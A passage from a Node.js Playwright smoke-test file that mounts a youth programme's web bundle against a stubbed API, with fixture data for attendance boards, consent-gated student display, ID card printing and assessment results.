#!/usr/bin/env node
/* ============================================================================
   UI smoke test — the two live boards and the ID Card Studio.

   `node build.js` only transforms JSX; it happily ships a component that
   references an identifier that no longer exists, which then blanks the page
   at runtime. This mounts the real production bundle against a stubbed NGGApi
   and checks what the build cannot:

     /status, /v-status — mount clean, render real numbers, and when the origin
       is unreachable show an honest "can't reach the server" state, a working
       Retry, and no pile-up of overlapping requests.
     /cards            — the studio mounts clean with all its print controls,
       so a change to the export options can't blank the page.

   Run:  node tests/ui-smoke.js
   Env:  PLAYWRIGHT_MODULE, CHROMIUM_PATH, BOARDS_PORT (default 8198).
   Skips with a pass if playwright isn't installed (like the other E2E tests).
   ========================================================================== */
const fs = require('fs'), path = require('path');
const { spawn } = require('child_process');
const { waitForServer } = require('./_serve');

const ROOT = path.resolve(__dirname, '..');
const PORT = process.env.BOARDS_PORT || 8198;
const BASE = 'http://127.0.0.1:' + PORT;
const FIX = path.join(ROOT, 'tests', '_boards_fixture.html');

function loadChromium() {
  for (const m of [process.env.PLAYWRIGHT_MODULE, 'playwright', 'playwright-core'].filter(Boolean)) {
    try { return require(m).chromium; } catch (_) {}
  }
  return null;
}

/* Shared stub for both public boards.
 *
 * The registration figures are deliberately odd numbers that appear nowhere
 * else on the page. The board is full of counts, so asserting on a round
 * number like 100 would pass against any coincidental match and prove
 * nothing — these are checked inside the registration section specifically,
 * and they have to have come from this payload. */
const STATUS = {
  status: {
    kpis: { totalStudents: 120, presentToday: 96, lateToday: 4, attendanceRate: 80, fulfillmentRate: 72,
            totalNeed: 50, totalFilled: 36, totalGap: 14, onTimeToday: 92,
            centres: 2, enrolled: 120, activeVolunteers: 11, starsThisWeek: 33,
            registered: 137, consentVerified: 118, consentPending: 19, capacity: 180, capacityFill: 76 },
    registration: {
      total: 137, verified: 118, pending: 19, today: 7, thisWeek: 23,
      capacity: 180, fill: 76, consentRate: 86,
      trend: [{ date: '2026-07-20', signups: 4 }, { date: '2026-07-21', signups: 9 }, { date: '2026-07-22', signups: 2 }],
    },
    byCentre: [
      { centreId: 'IJ', code: 'IJ', name: 'Ijaiye', color: '#3b5bdb', need: 20, filled: 14, gap: 6,
        present: 30, enrolled: 40, rate: 75, registered: 47, pending: 6, capacity: 60, fill: 78,
        stopped: 9, neverCame: 2, stillComing: 29, stoppedPct: 22.5,
        attendance: { present: 9, late: 1, onTime: 8, active: 14, rate: 75, sessions: 15, expected: 20, onTimePct: 87 } },
      { centreId: 'EG', code: 'EG', name: 'Egbeda', color: '#2f9e44', need: 30, filled: 22, gap: 8,
        present: 66, enrolled: 80, rate: 83, registered: 90, pending: 13, capacity: 120, fill: 75,
        stopped: 4, neverCame: 1, stillComing: 75, stoppedPct: 5,
        attendance: { present: 4, late: 0, onTime: 4, active: 22, rate: 100, sessions: 5, expected: 5, onTimePct: 100 } },
    ],
    /* Retention, shaped exactly as attendance_retention() emits it. Chosen so
       the two figures on the board point OPPOSITE ways: the headline rate is a
       healthy 80%, and 13 of 120 children have nonetheless stopped coming —
       almost all of them at Ijaiye (22.5%), which sits above the watch line on
       today's rate. If the board can only report the rate, that is invisible. */
    retention: {
      stoppedRun: 3, openDays: 18, from: '2026-07-06', to: '2026-07-24',
      children: 120, stopped: 13, neverCame: 3, stillComing: 104, stoppedPct: 10.8,
      byCentre: [
        { centre: 'Ijaiye', children: 40, stopped: 9, neverCame: 2, stillComing: 29, stoppedPct: 22.5 },
        { centre: 'Egbeda', children: 80, stopped: 4, neverCame: 1, stillComing: 75, stoppedPct: 5 },
      ],
    },
    /* The volunteer attendance breakdown, shaped exactly as
       volunteer_attendance_analysis() emits it. 20 of 25 days served with two
       late arrivals, so the page has to show 80% and 90% from the same block
       — a page that reads the wrong key shows a dash, not a plausible number. */
    attendance: {
      measurable: true, basis: 'calendar', days: 10, from: '2026-07-15', to: '2026-07-24',
      pendingDays: 0, windowDays: 30,
      kpis: { rate: 80, onTimePct: 90, sessions: 20, expected: 25, absences: 5, lateSessions: 2,
              halfDays: 1, avgLateMinutes: 20, measured: 3, reliable: 2 },
      trend: [
        { date: '2026-07-15', label: 'Wed 15 Jul', present: 2, eligible: 2, late: 0, rate: 100 },
        { date: '2026-07-16', label: 'Thu 16 Jul', present: 2, eligible: 2, late: 1, rate: 100 },
        { date: '2026-07-17', label: 'Fri 17 Jul', present: 1, eligible: 2, late: 0, rate: 50 },
        { date: '2026-07-18', label: 'Sat 18 Jul', present: 2, eligible: 2, late: 0, rate: 100 },
        { date: '2026-07-19', label: 'Sun 19 Jul', present: 1, eligible: 2, late: 0, rate: 50 },
        { date: '2026-07-20', label: 'Mon 20 Jul', present: 2, eligible: 3, late: 1, rate: 67 },
        { date: '2026-07-21', label: 'Tue 21 Jul', present: 2, eligible: 3, late: 0, rate: 67 },
        { date: '2026-07-22', label: 'Wed 22 Jul', present: 3, eligible: 3, late: 0, rate: 100 },
        { date: '2026-07-23', label: 'Thu 23 Jul', present: 2, eligible: 3, late: 0, rate: 67 },
        { date: '2026-07-24', label: 'Fri 24 Jul', present: 3, eligible: 3, late: 0, rate: 100 },
      ],
      bands: [
        { key: 'every', min: 90, label: 'Almost every day', color: '#2f9e44', count: 2 },
        { key: 'reliable', min: 75, label: 'Reliable', color: '#3b5bdb', count: 0 },
        { key: 'patchy', min: 50, label: 'Patchy', color: '#e8a92b', count: 1 },
        { key: 'rare', min: 0, label: 'Rarely in', color: '#e03131', count: 0 },
      ],
      byCentre: [
        { centre: 'Egbeda', people: 1, sessions: 5, expected: 5, absences: 0, late: 0, onTime: 5, rate: 100, onTimePct: 100, band: 'every' },
        { centre: 'Ijaiye', people: 2, sessions: 15, expected: 20, absences: 5, late: 2, onTime: 13, rate: 75, onTimePct: 87, band: 'reliable' },
      ],
      byRole: [
        { role: 'instructor', people: 1, sessions: 5, expected: 5, absences: 0, late: 0, onTime: 5, rate: 100, onTimePct: 100, band: 'every' },
        { role: 'mentor', people: 2, sessions: 15, expected: 20, absences: 5, late: 2, onTime: 13, rate: 75, onTimePct: 87, band: 'reliable' },
      ],
      /* Retention, shaped as volunteer_attendance_analysis() emits it, and built
         so it CONTRADICTS the rate above: 80% attendance, and three of the eight
         settled volunteers are gone. Ghostfield is the case the panel exists for
         — two volunteers, neither of them ever turning up, so it has no rate at
         all and is invisible on the rate table. */
      retention: {
        stoppedRun: 3, people: 9, coming: 5, stopped: 2, never: 1, new: 1,
        settled: 8, stoppedPct: 25, neverPct: 12.5,
        byCentre: [
          { centre: 'Ghostfield', people: 2, coming: 0, stopped: 1, never: 1, new: 0, settled: 2, stoppedPct: 50, neverPct: 50 },
          { centre: 'Ijaiye', people: 4, coming: 3, stopped: 1, never: 0, new: 0, settled: 4, stoppedPct: 25, neverPct: 0 },
          { centre: 'Egbeda', people: 3, coming: 2, stopped: 0, never: 0, new: 1, settled: 2, stoppedPct: 0, neverPct: 0 },
        ],
        byRole: [
          { role: 'mentor', people: 6, coming: 3, stopped: 2, never: 1, new: 0, settled: 6, stoppedPct: 33.3, neverPct: 16.7 },
          { role: 'instructor', people: 3, coming: 2, stopped: 0, never: 0, new: 1, settled: 2, stoppedPct: 0, neverPct: 0 },
        ],
      },
      caveats: ['Expected days are programme days since a volunteer joined. There is no rota in the system, '
              + 'so someone who agreed to come one day a week reads low here.'],
    },
    /* Three students covering every consent combination the backend can
       emit. The board must name exactly one of them and picture exactly one
       of them — getting this wrong publishes a child's face without their
       guardian's permission, so it is asserted in both directions. */
    members: [
      // Full consent: named AND pictured.
      { handle: 'brightspark', name: 'Adaeze Okonkwo', photo: '/assets/logo.png',
        centre: 'Ijaiye', faculty: 'Tech', color: '#f5b026', points: 300, weekPoints: 120, stars: 5, attendance: 90, streak: 6, move: 1 },
      // site_visibility only: named, but NO photograph.
      { handle: 'quietriver', name: 'Bode Adeyemi', photo: null,
        centre: 'Egbeda', faculty: 'Arts', color: '#b07cff', points: 200, weekPoints: 80, stars: 3, attendance: 80, streak: 4, move: 0 },
      // No consent at all: handle only, exactly as before.
      { handle: 'stonelion', name: null, photo: null,
        centre: 'Ijaiye', faculty: 'Tech', color: '#2f9e44', points: 100, weekPoints: 40, stars: 1, attendance: 70, streak: 2, move: -1 },
      /* A generated handle at full length. This is what broke the roster: a
         bare `1fr` column is minmax(AUTO, 1fr), auto is min-content, and
         min-content for an unbreakable string is the whole string — so this
         one row widened its own column and squeezed every other card in the
         grid to a different size. */
      { handle: 'egbusor-chiemerie-benedict-d062', name: null, photo: null,
        centre: 'Egbe-Idimu', faculty: 'Arts', color: '#b07cff', points: 60, weekPoints: 10, stars: 0, attendance: 0, streak: 0, move: 0 },
    ],
    faculties: ['Tech', 'Arts'],
    directory: [
      { handle: '@ada.o', initial: 'A', role: 'mentor', centre: 'Ijaiye', color: '#3b5bdb', faculty: 'Tech',
        course: '', face: '', sessions: 24, sinceWk: 1,
        window: { sessions: 10, expected: 10, rate: 100, late: 2, onTime: 8, onTimePct: 80, streak: 10, band: 'every' } },
      { handle: '@vol-1a2b', initial: 'M', role: 'mentor', centre: 'Ijaiye', color: '#3b5bdb', faculty: 'Arts',
        course: '', face: '', sessions: 9, sinceWk: 3,
        window: { sessions: 5, expected: 10, rate: 50, late: 0, onTime: 5, onTimePct: 100, streak: 0, band: 'patchy' } },
      /* Joined this morning: no open days yet. The card must not print
         "0 of 0 days" or divide by it. */
      { handle: '@vol-9f8e', initial: 'I', role: 'instructor', centre: 'Egbeda', color: '#2f9e44', faculty: 'Tech',
        course: 'Robotics', face: '', sessions: 0, sinceWk: 1, window: null },
    ],
    deltas: {}, page: { published: true },
  },
};

/* Club leaderboard: real rows carrying stars alongside XP. Two members only,
   which used to be BELOW the three-row threshold that silently swapped in
   twelve invented people from data.js. */
const LEADERBOARD = {
  leaderboard: [
    { memberId: 'NGG-1', first: 'Adaeze', initial: 'O.', centre: 'Ijaiye', xp: 2140, level: 7, streak: 21, week: 8, stars: 37, starsThisWeek: 6 },
    { memberId: 'NGG-2', first: 'Tunde', initial: 'B.', centre: 'Egbeda', xp: 2980, level: 9, streak: 34, week: 10, stars: 12, starsThisWeek: 2 },
  ],
  total: 2,
};

/* Pull word/document.xml out of a .docx without a zip library.
   A .docx is a plain ZIP; the local file header is enough to find and inflate
   one entry, and asserting on the XML is the only way to know a Word file says
   what the screen said rather than merely being well-formed. */
function unzipDocumentXml(buf) {
  const zlib = require('zlib');
  for (let i = 0; i + 30 < buf.length; i++) {
    if (buf.readUInt32LE(i) !== 0x04034b50) continue;
    const nameLen = buf.readUInt16LE(i + 26), extraLen = buf.readUInt16LE(i + 28);
    if (buf.slice(i + 30, i + 30 + nameLen).toString('latin1') !== 'word/document.xml') continue;
    const start = i + 30 + nameLen + extraLen;
    const size = buf.readUInt32LE(i + 18);
    const raw = buf.slice(start, size ? start + size : undefined);
    return (buf.readUInt16LE(i + 8) === 8 ? zlib.inflateRawSync(raw) : raw).toString('utf8');
  }
  return '';
}

(async () => {
  const chromium = loadChromium();
  if (!chromium) { console.log('⏭  boards: skipped (playwright not installed)'); process.exit(0); }
  const exe = process.env.CHROMIUM_PATH
    || (fs.existsSync('/opt/pw-browsers/chromium-1194/chrome-linux/chrome') ? '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' : undefined);

  // Mount the built bundle directly: React, a stubbed NGGApi, then render the
  // board under test into a root div. No API, no router, no service worker.
  fs.writeFileSync(FIX, `<!doctype html><html><head>
<!-- REQUIRED for any assertion that measures a phone layout.
     Without it a mobile-emulated context falls back to a 980px layout viewport,
     so a 320px "phone" run measures a desktop page: the composer row came out
     946px wide at every width below 1180 and the crushed-field bug was
     invisible to this suite. -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<script>
  /* Opt-in stylesheets. The centre-hero assertions measure layout, and geometry
     read off an unstyled page means nothing — but loading the real CSS changes
     what innerText returns for every other board, so it is per-board. */
  if (new URLSearchParams(location.search).get('css') === '1') {
    ['/dist/styles.css', '/dist/styles-app.css'].forEach(function (h) {
      var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = h;
      document.head.appendChild(l);
    });
  }
</script>
</head><body><div id="root"></div>
<script src="/dist/vendor/react.production.min.js"></script>
<script src="/dist/vendor/react-dom.production.min.js"></script>
<script src="/dist/vendor/tanstack-table.min.js"></script>
<script src="/dist/data.js"></script>
<script src="/dist/photos.js"></script>
<script>
  window.__calls = { status: 0, volunteerStatus: 0 };
  window.__mode = new URLSearchParams(location.search).get('mode') || 'ok';
  var pending = [];
  function stub(name, payload) {
    return function () {
      window.__calls[name]++;
      /* ?noreg=1 serves the pre-registration payload shape — an API older
         than the frontend. The board must fall back to attendance-only
         rather than throwing, and it doubles as the control proving the
         registration section is driven by the payload, not hardcoded. */
      if (window.__mode === 'ok' && new URLSearchParams(location.search).get('noreg') === '1') {
        var stripped = JSON.parse(JSON.stringify(payload));
        if (stripped.status) {
          delete stripped.status.registration;
          ['registered', 'consentVerified', 'consentPending', 'capacity', 'capacityFill'].forEach(function (k) { delete stripped.status.kpis[k]; });
          (stripped.status.byCentre || []).forEach(function (c) { delete c.registered; delete c.pending; delete c.capacity; delete c.fill; });
        }
        return Promise.resolve(stripped);
      }
      /* ?noret=1 drops the retention block — what a deployment with no
         programme calendar actually sends. The board must render the
         attendance figures with the retention panel ABSENT, not with a
         reassuring 0%: "we cannot say yet" and "nobody has left" are
         different claims. Also the control proving the panel is driven by
         the payload rather than hardcoded. */
      if (window.__mode === 'ok' && new URLSearchParams(location.search).get('noret') === '1') {
        var nr = JSON.parse(JSON.stringify(payload));
        if (nr.status) {
          nr.status.retention = {};
          (nr.status.byCentre || []).forEach(function (c) {
            delete c.stopped; delete c.stillComing; delete c.neverCame; delete c.stoppedPct;
          });
        }
        return Promise.resolve(nr);
      }
      // ?empty=1 makes every board return an empty result set, so the
      // no-data states can be driven instead of only imagined.
      if (window.__mode === 'ok' && new URLSearchParams(location.search).get('empty') === '1') {
        var e = JSON.parse(JSON.stringify(payload));
        if (e.leaderboard) { e.leaderboard = []; e.total = 0; }
        if (e.status) { e.status.members = []; }
        return Promise.resolve(e);
      }
      if (window.__mode === 'ok') return Promise.resolve(payload);
      if (window.__mode === 'hang') return new Promise(function (res) { pending.push(res); });
      var e = new Error('timeout'); e.code = 'timeout'; e.status = 0;
      return Promise.reject(e);
    };
  }
  // The pages pull in shared chrome (Footer et al) and, for the studio, a tree
  // of admin endpoints. Any path not named below resolves empty, so unrelated
  // chrome can never fail an assertion; only the two board calls are counted.
  window.__fail = new URLSearchParams(location.search).get('fail') || '';
  function offline() { var e = new Error('timeout'); e.code = 'timeout'; e.status = 0; return Promise.reject(e); }
  function deep(over) {
    return new Proxy(function () { return Promise.resolve({}); }, {
      get: function (t, k) {
        if (over && Object.prototype.hasOwnProperty.call(over, k)) return over[k];
        // A stub assigned onto the proxy after construction (NGGApi.admin.policy
        // = {...}) lands on the target; without this the get trap shadowed it
        // with a fresh deep() and every call quietly resolved to {}.
        if (['length', 'name', 'prototype', 'arguments', 'caller', 'constructor'].indexOf(k) === -1
            && Object.prototype.hasOwnProperty.call(t, k)) return t[k];
        if (k === 'then' || typeof k === 'symbol') return undefined;
        return deep();
      },
      apply: function () { return Promise.resolve({}); },
    });
  }
  var PROGRAM = { program: 'NGG', year: '2026', motto: 'GROW', website: 'x.org', phone: '+234', widthMm: 54, heightMm: 75 };
  var ROSTER = { program: PROGRAM, cards: Array.from({ length: 30 }, function (_, i) {
    var n = i + 1;
    return { studentId: 'SUM-' + n, displayId: 'NGG/26/' + ('000' + n).slice(-4),
             firstName: (n === 7 ? 'ZEBRA' : 'NAME' + n), surname: 'SUR' + n,
             track: 'Arts', token: 'T' + n, photoUrl: '',
             /* Registration dates, so a print run can be cut by "since the last
                batch". #13 has NONE, which is the shape the oldest rows hold and
                the case a date range cannot speak about either way. */
             enrolledAt: n === 13 ? '' : '2026-07-' + ('0' + (n % 28 + 1)).slice(-2) + 'T09:00:00Z',
             // #13 has no centre at all — the shape a partial row arrives in.
             centre: n === 13 ? undefined
               : (n % 2 ? { name: 'Ijaiye', code: 'IJ', color: '#2E7DD1' }
                        : { name: 'Egbeda', code: 'EG', color: '#D64545' }) };
  }) };
  /* Volunteers get the same centre identity as students. VOL-3 is the legacy
     shape — a record filed before centres were captured — and must still draw
     a card rather than a hole. */
  /* NGG MEMBERS — the studio's third subject. Two with a printed ID and one
     without, because the point of the third tab is that the run shows you what
     will come off the printer wrong. */
  /* NOT named MEMBERS: data.js declares a global const MEMBERS, and the bundle
     has no module closures, so a fixture var of that name is a redeclaration
     that kills the whole page before it mounts. See CLAUDE.md on
     concatenation. (No backticks in this comment either — it lives inside the
     template literal that builds the fixture.) */
  var MEMBER_CARDS = { program: PROGRAM, cards: [
    { memberId: 'NGG-2026-0001', fullName: 'Adaeze Okafor', displayId: 'NGG/EG/0001',
      displayIdMissing: false, level: 'B', type: 'NGG', status: 'active', track: 'Music',
      disciplines: ['Music'], centre: { name: 'Egbeda', code: 'EG', color: '#76B043' },
      token: 'NGG-2026-0001', photoUrl: '', joinDate: '2026-01-04', expiresAt: '' },
    { memberId: 'NGG-2026-0002', fullName: 'Tunde Bakare', displayId: 'NGG/IJ/0002',
      displayIdMissing: false, level: 'C', type: 'NGG', status: 'active', track: 'Coding',
      disciplines: ['Coding'], centre: { name: 'Ijaiye', code: 'IJ', color: '#00225F' },
      token: 'NGG-2026-0002', photoUrl: '', joinDate: '2026-02-11', expiresAt: '' },
    { memberId: 'NGG-2026-0003', fullName: 'Ngozi Eze', displayId: 'NGG-2026-0003',
      displayIdMissing: true, level: '', type: 'NGG', status: 'active', track: '',
      disciplines: [], centre: { name: 'Egbeda', code: 'EG', color: '#76B043' },
      token: 'NGG-2026-0003', photoUrl: '', joinDate: '', expiresAt: '' },
  ] };
  var VOLS = { program: PROGRAM, cards: [
    { volunteerId: 'VOL-MEN-26-001', displayId: 'VOL-MEN-26-001', firstName: 'TUNDE', surname: 'BAKARE',
      role: 'Lead Mentor', tier: { name: 'Lead Mentor', code: 'LED', color: '#8A1538' }, token: 'V1', photoUrl: '',
      expiresAt: '2026-10-29', centre: { name: 'Egbeda', code: 'EG', color: '#D64545' } },
    { volunteerId: 'VOL-MEN-26-002', displayId: 'VOL-MEN-26-002', firstName: 'NGOZI', surname: 'EZE',
      role: 'Mentor', tier: { name: 'Mentor', code: 'MEN', color: '#00225F' }, token: 'V2', photoUrl: '',
      expiresAt: '2026-10-29', centre: { name: 'Ijaiye', code: 'IJ', color: '#2E7DD1' } },
    /* No centre AND no expiry: the programme mark stands in for the first, and
       the second has to be absent from the card rather than a blank row. */
    { volunteerId: 'VOL-MEN-26-003', displayId: 'VOL-MEN-26-003', firstName: 'OLD', surname: 'RECORD',
      role: 'Mentor', tier: { name: 'Mentor', code: 'MEN', color: '#00225F' }, token: 'V3', photoUrl: '',
      centre: null },
    /* A PALE centre colour. The band was hard-coded to white text with a drop
       shadow, which is fine on maroon and unreadable on this — and the card is
       printed, so nobody finds out until a box of two hundred arrives. The colour
       is admin-chosen in a picker, so this is not a corner case, it is one click
       away. */
    { volunteerId: 'VOL-INS-26-004', displayId: 'VOL-INS-26-004', firstName: 'PALE', surname: 'CENTRE',
      role: 'Instructor', faculty: 'Music', tier: { name: 'Instructor', code: 'INS', color: '#00225F' }, token: 'V4', photoUrl: '',
      expiresAt: '2026-10-29', centre: { name: 'Sunshine Annexe', code: 'SA', color: '#F7E36B' } },
    /* A centre colour IDENTICAL to the tier colour, and a name too long for one
       band line. The first used to need a keyline holding two touching colours
       apart; the two never touch now, so it has to render like any other card.
       The second used to run off the end of the card, and then — once it was
       being shrunk to fit — came out as the smallest type on the sheet. */
    { volunteerId: 'VOL-CRD-26-005', displayId: 'VOL-CRD-26-005', firstName: 'SAME', surname: 'LONGNAME',
      role: 'Coordinator', tier: { name: 'Coordinator', code: 'CRD', color: '#0A2A6E' }, token: 'V5', photoUrl: '',
      expiresAt: '2026-10-29', centre: { name: 'Ikotun-Egbe Community Hall', code: 'IEC', color: '#0A2A6E' } },
  ] };
  window.NGGApi = deep({
    imageTools: function () {
      if (window.ImageTools) return Promise.resolve(window.ImageTools);
      return new Promise(function (res, rej) {
        var sc = document.getElementById('it') || document.createElement('script');
        sc.id = 'it'; sc.src = '/vendor/image-tools.js';
        sc.onload = function () { res(window.ImageTools); };
        sc.onerror = function () { rej(new Error('no image tools')); };
        if (!sc.parentNode) document.head.appendChild(sc);
      });
    },
    admin: deep({ registration: deep({
      cards: function () { return window.__fail === 'all' ? offline() : Promise.resolve(ROSTER); },
      volunteerCards: function () { return window.__fail === 'all' ? offline() : Promise.resolve(VOLS); },
      memberCards: function () { return window.__fail === 'all' ? offline() : Promise.resolve(MEMBER_CARDS); },
      centres: function () { return Promise.resolve({ centres: [] }); },
      /* The roster's own read: how many children have no ID, split by what would
         actually fix it. Two ready, one held on a photo, one awaiting consent. */
      qrGaps: function () { return Promise.resolve({ ok: true, verified: 1, missingQr: 0, unreachable: 0,
        unreachableList: [], sample: [], noId: 3, noIdReady: 2, heldPhoto: 1,
        unissuedList: [{ studentId: 'STU-4', fullName: 'Dele Delta', centre: 'Egbeda', reason: '' }],
        awaitingConsent: 1, encoder: true }); },
      resendIdBulk: function (scope, centre) {
        window.__bulk = { scope: scope, centre: centre };
        return Promise.resolve({ ok: true, issued: 2, queued: 1, remaining: 0,
                                 held: [{ studentId: 'STU-9', reason: 'photo_pending' }], scope: scope });
      },
      // A secondary endpoint failing must not take the roster down with it.
      hierarchy: function () { return window.__fail ? offline() : Promise.resolve({ tiers: [] }); },
      /* Gate links, as the panel loads them — one of each door, because
         telling them apart is the whole job of the screen. */
      gates: function () { return Promise.resolve({ gates: [
        { gateId: 'GL-DESK', kind: 'desk', path: '/gate?g=', name: 'Egbeda desk', hasPassword: true,
          status: 'active', usedCount: 12, createdAt: '2026-07-01T09:00:00Z' },
        { gateId: 'GL-SELF', kind: 'self', path: '/apply?g=', name: 'Alimosho public sign-up', hasPassword: false,
          status: 'active', usedCount: 240, createdAt: '2026-07-02T09:00:00Z' },
        { gateId: 'GL-REV', kind: 'review', path: '/review?g=', name: 'Alimosho review desk', hasPassword: true,
          status: 'active', usedCount: 31, createdAt: '2026-07-03T09:00:00Z' },
      ] }); },
      gateCreate: function (name, exp, pw, centre, opts) { window.__gateCreates.push({ name: name, pw: pw, opts: opts }); return Promise.resolve({ ok: true, gateId: 'GL-NEW', kind: (opts || {}).kind, hasPassword: !!pw, password: '', url: 'https://x.org/apply?g=GL-NEW' }); },
    }),
    /* The volunteer roster, as the admin console loads it. Three centres,
       and two records filed before centres were captured — the shape the
       missing-centre filter exists for. One of those two has an empty string
       rather than a null, because that is what the older rows actually hold
       and a filter that only catches null would miss half of them. */
    volunteers: deep({ list: function () { return Promise.resolve({ pending: [], volunteers: [
      { volunteerId: 'VOL-001', fullName: 'Tunde Bakare', email: 't@x.org', role: 'mentor', centre: 'Egbeda', safeguarding: 'cleared', status: 'active', token: 'V1', courses: [] },
      { volunteerId: 'VOL-002', fullName: 'Ngozi Eze', email: 'n@x.org', role: 'mentor', centre: 'Ijaiye', safeguarding: 'cleared', status: 'active', token: 'V2', courses: [] },
      { volunteerId: 'VOL-003', fullName: 'Segun Adeyemi', email: 's@x.org', role: 'instructor', centre: 'Egbeda', safeguarding: 'pending', status: 'active', token: 'V3', courses: [] },
      { volunteerId: 'VOL-004', fullName: 'Old Record', email: 'o@x.org', role: 'mentor', centre: '', safeguarding: 'pending', status: 'active', token: 'V4', courses: [] },
      { volunteerId: 'VOL-005', fullName: 'Older Record', email: 'oo@x.org', role: 'mentor', safeguarding: 'pending', status: 'active', token: 'V5', courses: [] },
    ] }); } }),
    }),
    public: deep({
    status: stub('status', ${JSON.stringify(STATUS)}),
    leaderboard: stub('leaderboard', ${JSON.stringify(LEADERBOARD)}),
    volunteerStatus: stub('volunteerStatus', ${JSON.stringify(STATUS)}),
  }) });
  window.__gateCreates = [];
  window.__errors = [];
  window.addEventListener('error', function (e) { window.__errors.push(String(e.message)); });
</script>
<script src="/dist/app.min.js"></script>
<script>
  var b = new URLSearchParams(location.search).get('board');
  var which = b === 'vol' ? 'VolunteerStatusPage' : b === 'cards' ? 'CardStudio' : b === 'photo' ? 'PhotoEditor'
            : b === 'policy' ? 'SummerPolicy' : b === 'att' ? 'SummerAttendance' : b === 'kiosk' ? 'SummerKiosk'
            : b === 'signin' ? 'CmStudentSignIn' : b === 'gatephoto' ? 'GatePhoto' : b === 'capture' ? 'PhotoCapture' : b === 'fieldupload' ? 'FieldUpload' : b === 'centre' ? 'CentreDetail'
            : b === 'builder' ? 'SummerFormBuilder' : b === 'gatereg' ? 'GateRegister'
            : b === 'arcade' ? 'CmArcade'
            : b === 'mentor' ? 'MentorPortal'
            : b === 'consent' ? 'MemberConsentEditor'
            : b === 'checkin' ? 'GateCheckin'
            : b === 'roster' ? 'SummerRoster'
            : b === 'vols' ? 'AdminVolunteers'
            : b === 'gates' ? 'SummerGates'
            : b === 'analyst' ? 'AnalystPane'
            : b === 'analytics' ? 'AnalyticsWorkspace'
            : b === 'assess' ? 'AdminAssessment'
            : b === 'fees' ? 'AdminFees'
            : b === 'composer' ? 'CmComposer'
            : b === 'account' ? 'DashboardObligations'
            : b === 'gatedesk' ? 'GatePage'
            : b === 'summer' ? 'SummerPage' : b === 'club' ? 'ClubPage' : 'StatusPage';
  var props;
  if (b === 'gatedesk') {
    /* The gate desk's locked state. The 'who' param picks who is sitting on the
       device: nobody, or a signed-in profile with no staff access — the
       reported bug. GatePage reads window.useAuth at render, which is the one
       binding in this bundle an override actually intercepts.
       (No backticks in here: this whole block lives inside a template literal.) */
    props = {};
    var who = new URLSearchParams(location.search).get('who') || 'nobody';
    window.__signedOut = 0;
    window.__signInOpened = 0;
    var gateMember = { memberId: 'NGG-2025-0777', fullName: 'Ngozi Parent', email: 'parent@example.com', caps: [] };
    window.useAuth = function () {
      return {
        isSignedIn: who !== 'nobody',
        member: who !== 'nobody' ? gateMember : null,
        isAdmin: false, caps: [],
        openSignIn: function () { window.__signInOpened++; },
        refresh: function () { return Promise.resolve(); },
        signOut: function () { window.__signedOut++; return Promise.resolve(); },
      };
    };
    /* Assign the WHOLE auth object, not auth.logout. NGGApi is a deep() proxy
       and 'auth' is not one of its root keys, so reading window.NGGApi.auth
       mints a throwaway proxy every time — a property hung on that is lost the
       moment it is read again, and the call silently resolves to {} instead. */
    window.NGGApi.auth = {
      logout: function () { window.__signedOut++; return Promise.resolve({}); },
      me: function () { return Promise.resolve({ member: null }); },
    };
    window.NGGApi.public.gate = {
      context: function () {
        // Every code in DESK_RELOCK has to reach the password box, not a dead end.
        var code = new URLSearchParams(location.search).get('code') || 'forbidden';
        if (window.__unlocked) return Promise.resolve({
          gate: { name: 'Egbeda desk', cohortId: 'C1' }, cohort: { cohortId: 'C1', name: 'Summer 2026' },
          form: { version: 3, fields: [] }, geo: null, centre: 'Egbeda', duty: null, consentTypes: [],
        });
        var e = new Error(code); e.code = code; e.status = code === 'forbidden' ? 403 : 401;
        return Promise.reject(e);
      },
      unlock: function (gid, pw) {
        window.__unlockTried = { gate: gid, password: pw };
        if (pw !== 'desk-pass-9x') { var e = new Error('bad_password'); e.code = 'bad_password'; return Promise.reject(e); }
        window.__unlocked = true;
        return Promise.resolve({ gate: { gateId: gid, name: 'Egbeda desk' } });
      },
    };
  } else if (b === 'assess') {
    props = {};
    var GAIN = {
      instrument: { instrumentId: 'AI-1', name: 'EGRA oral reading', domain: 'literacy',
                    domainLabel: 'Literacy', maxScore: 50, items: 20, version: 1, locked: true,
                    gradeFrom: 4, gradeTo: 9, status: 'active', notes: '',
                    unit: '', scale: 'points', pctMeaningful: true, higherIsBetter: true,
                    source: '', licence: '', citation: '', adaptNote: '', catalogueKey: '' },
      pctMeaningful: true, scale: 'points', unit: '', higherIsBetter: true, improved: true,
      baselineMean: 20.8, endlineMean: 29.0, pairedBaselineMean: 19.0,
      baselineWindow: 'AW-B', endlineWindow: 'AW-E',
      satBaseline: 40, satEndline: 24, paired: 24,
      baselineMeanPct: 41.5, endlineMeanPct: 58.0, pairedBaselinePct: 38.0,
      gain: { n: 24, mean: 8.4, sd: 5.1, lo: 6.2, hi: 10.6, d: 1.65, significant: true, tooThin: false },
      gainPct: 16.8,
      bySex: [{ group: 'Female', n: 13, meanGain: 9.1, lo: 6.0, hi: 12.2, d: 1.7, significant: true, tooThin: false },
              { group: 'Male', n: 11, meanGain: 7.6, lo: 4.1, hi: 11.1, d: 1.4, significant: true, tooThin: false },
              { group: 'Not recorded', n: 2, meanGain: 3.0, lo: -9.0, hi: 15.0, d: 0.3, significant: false, tooThin: true }],
      byBand: [{ group: 'Primary 4–6', n: 15, meanGain: 9.0, lo: 6.1, hi: 11.9, d: 1.6, significant: true, tooThin: false }],
      byCentre: [],
      attrition: { baselineOnly: 16, endlineOnly: 0,
                   bias: { leftMean: 33.0, stayedMean: 38.0, deltaPoints: 5.0, direction: 'leavers_were_weaker' } },
      caveats: [
        { level: 'method', text: 'Pre/post with no comparison group. This measures how much these children changed, not how much of the change the programme caused — children also get older, and school continues around us.' },
        { level: 'warn', text: '60% of the children who sat the baseline came back for the endline. Below about 70% the paired group stops representing the cohort.' },
        { level: 'warn', text: 'The children who did not return scored 5 points lower at baseline than those who did. The gain below is therefore larger than the cohort as a whole achieved.' },
      ],
    };
    /* A RATE instrument alongside the marks-out-of-a-total one. Correct words
       per minute has no maximum, so every percent field is null and the screen
       has to print the unit — a page that falls back to "0%" here is quietly
       inventing a denominator. On the SDQ side, higherIsBetter is false, so a
       negative mean is the improvement and the colour has to follow that
       rather than the sign. */
    var RATE = {
      instrument: { instrumentId: 'AI-2', name: 'SDQ total difficulties', domain: 'sel',
